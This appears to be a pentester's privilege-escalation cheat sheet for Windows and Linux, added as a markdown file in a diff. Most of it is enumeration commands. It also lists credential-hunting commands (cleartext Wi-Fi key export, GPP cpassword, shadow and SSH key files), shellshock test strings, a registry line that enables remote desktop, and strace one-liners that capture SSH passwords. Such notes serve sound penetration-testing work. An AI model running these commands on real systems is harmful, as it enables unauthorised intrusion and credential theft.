@@ -1,0 +1,284 @@
+# privilege escalation privesc
+
+http://pwnwiki.io
+
+# windows
+https://docs.google.com/document/d/1U10isynOpQtrIK6ChuReu-K1WHTJm4fgG3joiuz43rw/edit
+
+date /t & time /t
+net time \\computername
+
+whoami /all
+ver
+set
+systeminfo | findstr /r /c:"^Host Name" /c:"^OS Name:" /c:"^OS Version:" /c:"^System Type:"
+PS C:\> $PSVersionTable.BuildVersion
+
+fsutil fsinfo drives
+fsutil volume diskfree c: # or dir c:\
+
+netsh int ip show config
+netsh wlan export profile key=clear
+type %systemroot%\system32\drivers\etc\hosts
+ipconfig /displaydns # client dns cache
+nbtstat -c # netbios name cache
+
+netstat -anb
+netstat -a -n -p tcp | find "ESTAB"
+netstat -a -n -p tcp | find "LISTEN"
+netstat -a -n -p udp
+netstat -rn
+
+wmic computersystem get Name, domain, Manufacturer, Model, NumberofProcessors, PrimaryOwnerName,Username, Roles, totalphysicalmemory /format:list
+wmic process list full
+more at http://translate.wooyun.io/2015/10/10/WMI-Attacks.html
+
+net accounts /domain # pw policy for the domain
+
+net share # list of shares on the server
+net view \\computername # list of shares on a remote computer 
+net session # list SMB sessions of users connected to the server
+net file # list of open shared files on the server
+
+reg query hklm\system\currentcontrolset\control\lsa # stores LM hashes
+nbtstat -A <IP>
+net config workstation or server # view the domain name of current machine
+reg query "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Group Policy\History" /v DCName # view the name of the domain controller
+
+net view # list computers
+net view /domain # list all domains available to the host
+net view /domain:otherdom
+net view /domain:dom # list hosts that exist on the domain
+net group "Domain Computers" /domain
+
+for /f %i in (hosts.txt) do @(net view \\%i >> shares.txt 2>nul) # list active shares
+
+qwinsta or query session /server:computername /counter # list RDP sessions
+reg query "[\\machine\]hklm\software\microsoft\windows nt\currentversion\profilelist" /s | findstr /i "profileimagepath" # view recent logons or even simpler: dir /od \users
+reg query "hklm\software\microsoft\windows nt\currentversion\winlogon\cachedlogonscount" # entry might not exist. creds are in hklm\security\cache
+
+reg.exe query HKU # list of users currently logged in
+reg.exe query HKUS-1-5-21-... then need to find a way to resolve sids on the cmdline
+reg add "HKLM\System\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections /t REG_DWORD /d 0 /f # enable remote desktop
+
+systeminfo # but doesnt list all KBs
+wmic qfe list # lists installed security patches
+reg save HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Updates updates.reg
+wusa /uninstall /kb:<kbnum> # uninstall patch
+msinfo32 (GUI) ou msinfo32 /report msinfo.txt (CLI) # used to be winmsd.exe
+
+PsInfo # list of all hostfixes, uptime etc.
+PsSid
+
+powershell -Command Get-ChildItem -Recurse Cert: | findstr -i Superfish 
+
+tasklist /svc
+taskkill /f /im "cmd.exe" # killall
+net start or sc query or sc queryex
+sc stop aZeI
+sc delete aZeI
+del /F c:\zbSJCelh.exe
+
+qprocess /server:computername *
+tasklist /v /s computername
+
+net statistics workstation # uptime
+task manager -> performance # uptime for windows 2008
+
+tree c:\ /f /a 
+dir /od # ls -ltr
+
+dir /a /s *assw* # find interesting files
+findstr /i /s password * # find interesting strings in files
+passhunt.exe -r "domain.(foo|bar)" -x c:\windows
+passhunt.exe -r "/user:" -x c:\windows
+panhunt.exe
+
+type C:\sysprep.inf [clear]
+type C:\sysprep\sysprep.xml
+%WINDIR%\Panther\Unattend
+msf auxiliary/dcerpc/windows_deployment_services
+
+index all avail shares with Recoll (docx, zip, etc.) (http://hackerforhire.com.au/post-exploitation-finding-passwords-in-haystacks/)
+
+accesschk.exe -uwqs users c:\ # sysinternals
+calcs "c:\Program Files" /T | findstr Users
+icacls \\hackmedc\docs # determine perms
+
+gpresult /z /h outputfile.html # view GPOs that have been applied to a system
+gpresult /R
+gpresult /Z # verbose
+
+when local 500 is renamed and set a random password via a Group Policy Preferences, password can be decrypted by any authenticated domain users
+net use z: \\DC\SYSVOL and search for cpassword= in *.xml under like Groups.xml
+find machines with the gpp (http://www.harmj0y.net/blog/powershell/gpp-and-powerview/)
+
+netsh firewall show state
+netsh advfirewall show allprofiles
+netsh firewall set opmode disable|enable
+
+sc query state= all
+
+* list all *.msc progs
+dir c:\windows\system32 | findstr msc
+mmc
+gpedit.msc 
+
+autoruns
+sigverif # verif des signatures
+
+tasklist /SVC # liste des services qui fonctionnent
+tasklist /v /fo list # quels processus une application est liee
+
+* bonus tips
+color 0a
+type \\.\c:\wfmgr.cfg
+psinfo # shows uptime
+xcopy srcdir dstdir /E # cp -r
+
+* am i admin
+dir \\DC\C$
+at \\DC # list scheduled tasks
+
+* command lists
+http://www.networkpentest.net/p/windows-command-list.html
+
+Network Intrusion Process https://scriptjunkie.us/files/networkintrusionpostermed.png
+Build a Secure Network by Matt Weeks @scriptjunkie http://www.irongeek.com/i.php?page=videos/derbycon3/4101-pigs-don-t-fly-why-owning-a-typical-network-is-so-easy-and-how-to-build-a-secure-one-matt-scriptjunkie-weeks (DerbyCon 2013)
+Encyclopedia of Windows Privilege Escalation by Brett Moore (Insomnia) http://www.youtube.com/watch?v=kMG8IsCohHA (Ruxcon 2011)
+The Dirty Little Secrets They Dont Teach You In Pentesting Class, Rob Fuller Chris Gates, part2: https://www.youtube.com/watch?v=JKcs2VuTSJg (DerbyCon 2012) & part1 but p basic: https://www.youtube.com/watch?v=xXqyogdxITE (DerbyCon 2011)
+Exploiting weak folder permissions http://www.greyhathacker.net/?p=738
+Pwn .bat admin scripts that expand %CD% in a directory under our control http://thesecurityfactory.be/command-injection-windows.html
+
+* summary
+http://www.r00tsec.com/2014/10/howto-summary-privilege-escalation.html
+
+* extract passwords
+http://www.nirsoft.net/utils/bullets_password_view.html
+http://aluigi.altervista.org/pwdrec.htm
+
+* EoP
+https://github.com/koczkatamas/CVE-2016-0051
+
+# linux
+id
+uname -a
+w
+who # usernames not truncated
+last | head -n 50
+last -w
+sudo -l
+getent passwd
+env
+uptime
+
+/etc/passwd
+/etc/shadow
+/etc/group
+/etc/sudoers
+/etc/ssh/sshd_config
+/etc/fstab
+/etc/mtab
+/proc/mounts
+/etc/exports
+/etc/syslog.conf
+/etc/rsyslog.conf
+/etc/issue,motd,system-release,redhat-release,centos-release,lsb-release,os-release,debian_version,SuSE-release, ...
+/etc/cron*
+/etc/anacrontab
+/var/spool/cron* # may vary
+/etc/inetd.conf
+/etc/xinetd.conf
+/etc/sysconfig/iptables # may vary
+
+hostname
+ps fauxww
+ps auxe # show environment
+ifconfig ; ip ad
+netstat -nr
+/etc/hosts
+/etc/resolv.conf
+/etc/nsswitch.conf
+netstat -an
+/proc/net/ip_conntrack
+iptables-save or iptables -S
+
+/proc/version
+/proc/sys/kernel/osrelease
+/proc/sys/kernel/version
+/proc/sys/kernel/hostname
+/proc/sys/kernel/domainname
+/proc/sys/kernel/..
+/proc/net/{tcp,tcp6,udp,unix} | parse_net_tcp.py
+/proc/net/arp # neighbours
+
+/proc/self/environ
+/proc/self/cmdline
+/proc/self/maps
+/proc/self/loginuid
+
+; setuid, setguid files
+find / -type f -perm -4000 \! -type l \! -type b \! -type c \! -type s -ls 2>/dev/null
+find / -type f -perm -2000 \! -type l \! -type b \! -type c \! -type s -ls 2>/dev/null
+; world writable
+find / -type f -perm -002  \! -type l \! -type b \! -type c \! -type s -ls 2>/dev/null | grep -v ' /proc/'
+find / -type d -perm -002  -ls 2>/dev/null
+
+; files or groups with no owners
+find / \( -nouser -o -nogroup \) -ls 2>/dev/null
+; symlinks that point to writable file/dir
+
+; find writeable libs called by setuid bins or not
+find / -type f -perm /6000 -exec ls -1 {} \; 2>/dev/null | xargs -i ldd {} | grep -oE '/[^ ]+' | sort -u | xargs ls -Ll | grep -iE '^(....w....|.......w.)'
+; find libs with RPATH sections http://seclists.org/fulldisclosure/2010/Oct/257
+while read f; do readelf -d "$f"| grep RPATH && echo "$f" >> /tmp/libs_with_rpath.txt; done < <(find / -type f -perms /6000)
+while read f; do ldd "$f" 2>/dev/null | grep -f /tmp/libs_with_rpath.txt && echo "$f" >> /tmp/bins_with_rpath.txt; done < <(cat /tmp/libs_with_rpath.txt)
+
+; writable outside of the user's HOME
+find / -type f -user $USER -perm /222 -ls 2>/dev/null | grep -vE " (/proc/|$HOME)"
+find / -type d -user $USER -perm /222 -ls 2>/dev/null | grep -vE " (/proc/|$HOME)"
+; only root can read
+find / \( -path /proc -o -path /sys -o -path /dev \) -prune -o -user root ! -perm /004 -ls 2>/dev/null
+
+rpm -qa --last
+
+shellshock
+env x='() { :;}; echo pwn3d' bash -c "blah"
+ssh -o 'rsaauthentication yes’ 192.168.1.1 '() { ignored; }; id'
+
+wildcard attacks https://www.exploit-db.com/papers/33930/
+
+* common paths
+http://wiki.apache.org/httpd/DistrosDefaultLayout, lfipwn/core/techniques/LFIApacheLog.py, exploit-database/platforms/php/webapps/15964.py
+http://www.blackhatlibrary.net/File_Inclusion
+
+* elevate 
+.*history
+.*rc
+.ssh / known_hosts, config, authorized_keys{,2}, id_rsa, id_dsa
+.vnc/passwd
+...
+
+grep .*_history for:
+  rsh, rhost, rcp, ssh, scp, ...
+  su -
+  sudo
+identifier les VIP
+
+local root exploits # look at exploit suggesters in tools/post
+sysdig strace systemtab # in tools/post/
+
+backdoor su, sudo, ...
+capture ssh passwords: sudo strace -f -e read -p <pid_of_sshd> 2>log OR strace -e write -p <pid_of_sshd> 2>&1 | egrep "^write\(.*1\)"
+prettier: strace -p 13909 2>&1 | awk '/^write\(.*1\)/ {gsub(/\"/, "");gsub(/\,/, "");gsub(/\\r/, "\\n");sub(/[0-9]*\)/," ",$2);sub(/\\177/,"\b",$2);sub(/\\t/,"\t",$2);sub(/\\3/,"\^C",$2);printf $2}'
+or python script skl.py from netspi
+
+look into tools/* (eg. lynis)
+
+http://netsec.ws/?p=309 # LinEnum, LinuxPrivChecker, g0tmi1k's blog (http://blog.g0tmi1k.com/2011/08/basic-linux-privilege-escalation/)
+
+# bypassing nosuid, noexec
+CVE-2014-5206/CVE-2014-5207 http://seclists.org/oss-sec/2014/q3/352
+
+# Solaris
+dispuid # display a list of all valid user names
